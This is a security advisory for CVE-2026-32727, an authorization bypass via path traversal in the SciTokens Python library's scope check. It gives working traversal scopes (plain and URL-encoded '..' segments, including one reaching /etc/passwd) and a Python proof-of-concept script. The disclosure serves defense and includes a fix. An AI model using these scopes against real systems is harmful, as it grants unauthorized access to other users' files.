# [H] SciTokens has an Authorization Bypass via Path Traversal in Scope Validation

## Summary
Severity: High
Advisory: GHSA-3x2w-63fp-3qvw
CVE: CVE-2026-32727
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-31
Source: https://github.com/advisories/GHSA-3x2w-63fp-3qvw
Type: github-advisory

## Affected
- PyPI: `scitokens` — affected >=0 <1.9.7

## Details
### Summary
The `Enforcer` is vulnerable to a path traversal attack where an attacker can use dot-dot (`..`) in the `scope` claim of a token to escape the intended directory restriction. This occurs because the library normalizes both the authorized path (from the token) and the requested path (from the application) before comparing them using `startswith`.

### Details
**File:** `src/scitokens/scitokens.py`  
**Methods:** `_check_scope`, `_scope_path_matches`  
**File:** `src/scitokens/urltools.py`  
**Method:** `normalize_path`

## Description
When a token is verified, the `Enforcer` extracts the authorized path from the `scope` or `scp` claim. This path is passed through `urltools.normalize_path`, which uses `posixpath.normpath` to resolve relative segments.

If a token has a scope like `read:/home/user1/..`, the normalization process converts this to `/home`. When the enforcer checks if a request for `/home/user2` is authorized, it compares it against the normalized path `/home`.

### Vulnerable Logic Flow:

1.  **Normalization:** In `_check_scope`, the path `/home/user1/..` is normalized to `/home`.
2.  **Comparison:** In `_scope_path_matches`, the requested path `/home/user2` is checked against the allowed path `/home`:
    ```python
    return requested_path.startswith(allowed_path + '/')
    # "/home/user2".startswith("/home/") is True
    ```

### Bypassing with URL Encoding:
Since `normalize_path` unquotes the path before normalizing, an attacker can also use URL-encoded dots (e.g., `%2e%2e`) to hide the traversal from simple string filters that don't account for encoding.

### Root Traversal:
A scope like `read:/anything/..` normalizes to `read:/`, which grants access to the entire file system (or whatever resource space the enforcer is guarding).

## Impact
An attacker who can influence the `scope` claim (e.g., in environments where tokens are issued with user-provided sub-paths) can gain access to directories and files outside of their intended authorization.

## Proof of Concept
The following examples demonstrate the bypass (see `poc_path_traversal.py` for a full reproduction):

- **Scope:** `read:/home/user1/..` -> **Access Granted to:** `/home/user2`
- **Scope:** `read:/anything/..` -> **Access Granted to:** `/etc/passwd`
- **Scope:** `read:/foo/%2e%2e/bar` -> **Access Granted to:** `/bar`
```


import scitokens
import os
import sys

# Ensure we can import from src
if os.path.exists("src"):
    sys.path.append("src")

def test_path_traversal_bypass():
    print("--- Proof of Concept: Path Traversal in Scope Validation ---")
    
    issuer = "https://scitokens.org"
    enforcer = scitokens.Enforcer(issuer)
    
    # Imagine an application that expects to restrict a user to their own directory: /home/user1
    # The application validates that the token has 'read' access to /home/user1
    
    # MALICIOUS TOKEN
    # An attacker provides a token with a scope that uses '..' to traverse up.
    # 'read:/home/user1/..' effectively resolves to 'read:/home'
    token = scitokens.SciToken()
    token['iss'] = issuer
    token['scope'] = "read:/home/user1/.."
    
    # VICTIM PATH
    # The attacker tries to access a sibling directory (another user's data)
    requested_path = "/home/user2"
    
    print(f"Token scope: {token['scope']}")
    print(f"Requested path: {requested_path}")
    
    # Internal normalization in Scitokens 1.9.6:
    # urltools.normalize_path("/home/user1/..") -> "/home"
    # urltools.normalize_path("/home/user2") -> "/home/user2"
    # Since "/home/user2".startswith("/home") is True, access is granted.
    
    print("\nTesting authorization...")
    is_authorized = enforcer.test(token, "read", requested_path)
    
    print(f"Is authorized: {is_authorized}")
    
    if is_authorized:
        print("\n[VULNERABILITY CONFIRMED]")
        print(f"The Enforcer ALLOWED access to {requested_path}")
        print(f"even though the scope was nominally restricted to /home/user1/..")
        print("This bypasses the intended directory isolation.")
    else:
        print("\n[VULNERABILITY NOT REPRODUCED]")
        print("The Enforcer blocked the access attempt.")

    # Another example: Root traversal
    print("\n--- Example 2: Root Traversal ---")
    token['scope'] = "read:/anything/.." # Resolves to /
    requested_path = "/etc/passwd" # Or any sensitive path
    
    print(f"Token scope: {token['scope']}")
    print(f"Requested path: {requested_path}")
    
    is_authorized = enforcer.test(token, "read", requested_path)
    print(f"Is authorized: {is_authorized}")
    
    if is_authorized:
        print("[VULNERABILITY CONFIRMED] Root traversal allowed access to ALL paths!")

if __name__ == "__main__":
    test_path_traversal_bypass()

```


## Recommended Fix
Validate that the path in the scope does not contain `..` components **after unquoting** but **before normalization**. Additionally, ensure that any validation errors raised during this process are subclasses of `ValidationFailure` so they are correctly handled by the `Enforcer.test` method.

## References
- https://github.com/scitokens/scitokens/security/advisories/GHSA-3x2w-63fp-3qvw
- https://nvd.nist.gov/vuln/detail/CVE-2026-32727
- https://github.com/scitokens/scitokens/pull/230
- https://github.com/scitokens/scitokens/commit/2d1cc9e42bc944fe0bbc429b85d166e7156d53f9
- https://github.com/scitokens/scitokens
- https://github.com/scitokens/scitokens/releases/tag/v1.9.7
